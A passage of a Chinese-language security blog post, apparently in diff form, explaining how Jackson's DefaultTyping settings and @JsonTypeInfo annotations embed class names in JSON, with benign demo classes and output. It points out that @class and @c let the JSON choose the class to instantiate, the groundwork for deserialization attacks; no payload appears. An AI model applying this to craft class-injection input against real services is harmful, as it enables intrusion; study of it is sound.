class="string">&quot;mi1k7ea&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;Jackson&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span>  </span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=mi1k7ea<span class="punctuation">,</span> <span class="punctuation">&#123;</span>skill=Jackson<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h4><p>OBJECT_AND_NON_CONCRETE：除了前面提到的特征，当类里有 Interface、AbstractClass 类时，对其进行序列化和反序列化（当然这些类本身需要时合法的、可被序列化的对象）。</p>
+<ul>
+<li>此外，<strong>enableDefaultTyping()默认的无参数的设置就是此选项。</strong></li>
+</ul>
+<p>添加一个 Sex 接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.object_and_non_concrete;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>添加 MySex 类实现 Sex 接口类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.object_and_non_concrete;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySex</span> <span class="keyword">implements</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="type">int</span> sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.sex = sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改 Person 类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着编写序列化与反序列化的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.object_and_non_concrete;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OBJECT_AND_NON_CONCRETE_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        p.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// 设置OBJECT_AND_NON_CONCRETE  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);  </span><br><span class="line">        <span class="comment">// 或直接无参调用，输出一样  </span></span><br><span class="line">        <span class="comment">//mapper.enableDefaultTyping();  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出，可以看到该Interface类属性被成功序列化和反序列化：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.java_lang_object.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.object_and_non_concrete.MySex&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker@<span class="number">6</span>d00a15d<span class="punctuation">,</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex@<span class="number">51</span>efea79</span><br></pre></td></tr></table></figure>
+<h4 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h4><p>NON_CONCRETE_AND_ARRAYS：除了前面提到的特征外，还支持 Array 类型。</p>
+<p>编写序列化与反序列化的代码，在 Object 属性中存在的是数组：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.non_concrete_and_arrays;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NON_CONCRETE_AND_ARRAYS_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        Hacker[] hackers = <span class="keyword">new</span> <span class="title class_">Hacker</span>[<span class="number">2</span>];  </span><br><span class="line">        hackers[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        hackers[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        p.object = hackers;  </span><br><span class="line">        p.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// 设置NON_CONCRETE_AND_ARRAYS  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出看到，类名变成了 <code>”[L”+类名+”;”</code>，序列化 Object 之后为数组形式，反序列化之后得到<code>[Lcom.mi1k7ea.Hacker;</code> 类对象，说明对 Array 类型成功进行了序列化和反序列化：</p>
+<h4 id="NON-FINAL"><a href="#NON-FINAL" class="headerlink" title="NON_FINAL"></a>NON_FINAL</h4><p>NON_FINAL：除了前面的所有特征外，包含即将被序列化的类里的全部、非 final 的属性，也就是相当于整个类、除 final 外的属性信息都需要被序列化和反序列化。</p>
+<p>修改 Person 类，添加 Hacker 属性：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">    <span class="keyword">public</span> Hacker hacker;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s, %s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex, hacker == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : hacker);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编写序列化与反序列化类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.non_final;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NON_FINAL_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        p.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();  </span><br><span class="line">        p.hacker = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// 设置NON_FINAL  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出看到，成功对非 final 的 hacker 属性进行序列化和反序列化：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.Person&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.java_lang_object.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.object_and_non_concrete.MySex&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;hacker&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.java_lang_object.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker@<span class="number">6</span>d00a15d<span class="punctuation">,</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex@<span class="number">51</span>efea79<span class="punctuation">,</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker@<span class="number">5034</span>c75a</span><br></pre></td></tr></table></figure>
+
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>从前面的分析知道，DefaultTyping 的几个设置选项是逐渐扩大适用范围的，如下表：</p>
+<table>
+<thead>
+<tr>
+<th>DefaultTyping类型</th>
+<th>描述说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>JAVA_LANG_OBJECT</td>
+<td>属性的类型为Object</td>
+</tr>
+<tr>
+<td>OBJECT_AND_NON_CONCRETE</td>
+<td>属性的类型为Object、Interface、AbstractClass</td>
+</tr>
+<tr>
+<td>NON_CONCRETE_AND_ARRAYS</td>
+<td>属性的类型为Object、Interface、AbstractClass、Array</td>
+</tr>
+<tr>
+<td>NON_FINAL</td>
+<td>所有除了声明为final之外的属性</td>
+</tr>
+</tbody>
+</table>
+
+<h3 id="JsonTypeInfo-注解"><a href="#JsonTypeInfo-注解" class="headerlink" title="@JsonTypeInfo 注解"></a>@JsonTypeInfo 注解</h3><p><code>@JsonTypeInfo</code> 注解是 Jackson 多态类型绑定的一种方式，支持下面5种类型的取值：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)</span></span><br></pre></td></tr></table></figure>
+
+<p>下面我们逐个看下。</p>
+<h4 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h4><p><strong>JsonTypeInfo_Id_NONE_Test.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsonTypeInfo_Id_NONE_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person2</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person2</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person2</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person2.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Person2 类，给 object 属性添加 <code>@JsonTypeInfo</code> 注解，指定为 <code>JsonTypeInfo.Id.NONE</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span>  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出看到，和没有设置值为 <code>JsonTypeInfo.Id.NONE</code> 的 <code>@JsonTypeInfo</code> 注解是一样的：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> <span class="punctuation">&#123;</span>skill=hiphop<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/ld_none_result.png" class>
+
+<h4 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h4><p>修改 Person2 类中的 object 属性 <code>@JsonTypeInfo</code> 注解值为 <code>JsonTypeInfo.Id.CLASS</code></p>
+<p>输出看到，object属性中多了 <code>&quot;@class&quot;:&quot;com.drunkbaby.Hacker&quot;</code> ，即含有具体的类的信息，同时反序列化出来的object属性Hacker类对象，即能够成功对指定类型进行序列化和反序列化：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@class&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.drunkbaby.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.Hacker@<span class="number">55</span>f3ddb1</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，在Jackson反序列化的时候如果使用了<code>JsonTypeInfo.Id.CLASS</code>修饰的话，可以通过@class的方式指定相关类，并进行相关调用。</p>
+<h4 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h4><p>修改 Person2 类中的object属性 <code>@JsonTypeInfo</code> 注解值为 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code></p>
+<p>输出看到，object属性中多了 <code>&quot;@c&quot;:&quot;com.drunkbaby.Hacker&quot;</code>，即使用 @c 替代了 @class，官方描述中的意思是缩短了相关类名，实际效果和 JsonTypeInfo.Id.CLASS 类似，能够成功对指定类型进行序列化和反序列化，都可以用于指定相关类并进行相关的调用：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@c&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.drunkbaby.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.Hacker@<span class="number">18</span>be83e4</span><br></pre></td></tr></table></figure>
+<h4 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h4><p>修改 Person2 类中的object属性 <code>@JsonTypeInfo</code> 注解值为 <code>JsonTypeInfo.Id.NAME</code></p>
